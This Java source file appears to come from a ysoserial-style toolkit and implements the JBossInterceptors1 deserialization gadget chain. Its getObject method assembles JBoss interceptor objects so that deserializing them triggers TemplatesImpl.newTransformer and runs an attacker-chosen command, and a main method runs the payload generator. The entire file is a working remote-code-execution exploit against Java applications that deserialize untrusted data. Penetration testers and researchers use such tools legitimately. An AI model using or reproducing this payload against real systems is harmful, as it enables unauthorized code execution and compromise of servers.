package cn.butler.yso.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.PayloadRunner;
import cn.butler.yso.payloads.util.Gadgets;
import cn.butler.yso.payloads.util.JavaVersion;
import cn.butler.yso.payloads.util.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import cn.butler.payloads.annotation.Authors;
import cn.butler.payloads.annotation.Dependencies;
import cn.butler.payloads.annotation.PayloadTest;
import org.jboss.interceptor.builder.InterceptionModelBuilder;
import org.jboss.interceptor.builder.MethodReference;
import org.jboss.interceptor.proxy.DefaultInvocationContextFactory;
import org.jboss.interceptor.proxy.InterceptorMethodHandler;
import org.jboss.interceptor.reader.ClassMetadataInterceptorReference;
import org.jboss.interceptor.reader.DefaultMethodMetadata;
import org.jboss.interceptor.reader.ReflectiveClassMetadata;
import org.jboss.interceptor.reader.SimpleInterceptorMetadata;
import org.jboss.interceptor.spi.instance.InterceptorInstantiator;
import org.jboss.interceptor.spi.metadata.InterceptorReference;
import org.jboss.interceptor.spi.metadata.MethodMetadata;
import org.jboss.interceptor.spi.model.InterceptionModel;
import org.jboss.interceptor.spi.model.InterceptionType;

import java.lang.reflect.Constructor;
import java.util.*;

/*
    by @matthias_kaiser
*/
@SuppressWarnings({"rawtypes", "unchecked"})
@PayloadTest(precondition = "isApplicableJavaVersion")
@Dependencies({ "javassist:javassist:3.12.1.GA", "org.jboss.interceptor:jboss-interceptor-core:2.0.0.Final",
    "javax.enterprise:cdi-api:1.0-SP1", "javax.interceptor:javax.interceptor-api:3.1",
    "org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final", "org.slf4j:slf4j-api:1.7.21" })
@Authors({ Authors.MATTHIASKAISER })
public class JBossInterceptors1 implements ObjectPayload<Object> {
    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAtLeast(7);
    }

    public Object getObject(final String command) throws Exception {

        final Object gadget = Gadgets.createTemplatesImpl(command);

        InterceptionModelBuilder builder = InterceptionModelBuilder.newBuilderFor(HashMap.class);
        ReflectiveClassMetadata metadata = (ReflectiveClassMetadata) ReflectiveClassMetadata.of(HashMap.class);
        InterceptorReference interceptorReference = ClassMetadataInterceptorReference.of(metadata);

        Set<InterceptionType> s = new HashSet<InterceptionType>();
        s.add(org.jboss.interceptor.spi.model.InterceptionType.POST_ACTIVATE);

        Constructor defaultMethodMetadataConstructor = DefaultMethodMetadata.class.getDeclaredConstructor(Set.class, MethodReference.class);
        Reflections.setAccessible(defaultMethodMetadataConstructor);
        MethodMetadata methodMetadata = (MethodMetadata) defaultMethodMetadataConstructor.newInstance(s,
                MethodReference.of(TemplatesImpl.class.getMethod("newTransformer"), true));

        List list = new ArrayList();
        list.add(methodMetadata);
        Map<org.jboss.interceptor.spi.model.InterceptionType, List<MethodMetadata>> hashMap = new HashMap<org.jboss.interceptor.spi.model.InterceptionType, List<MethodMetadata>>();

        hashMap.put(org.jboss.interceptor.spi.model.InterceptionType.POST_ACTIVATE, list);
        SimpleInterceptorMetadata simpleInterceptorMetadata = new SimpleInterceptorMetadata(interceptorReference, true, hashMap);

        builder.interceptAll().with(simpleInterceptorMetadata);

        InterceptionModel model = builder.build();

        HashMap map = new HashMap();
        map.put("ysoserial", "ysoserial");

        DefaultInvocationContextFactory factory = new DefaultInvocationContextFactory();

        InterceptorInstantiator interceptorInstantiator = new InterceptorInstantiator() {

            public Object createFor(InterceptorReference paramInterceptorReference) {

                return gadget;
            }
        };

        return new InterceptorMethodHandler(map, metadata, model, interceptorInstantiator, factory);

    }


    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(JBossInterceptors1.class, args);
    }
}
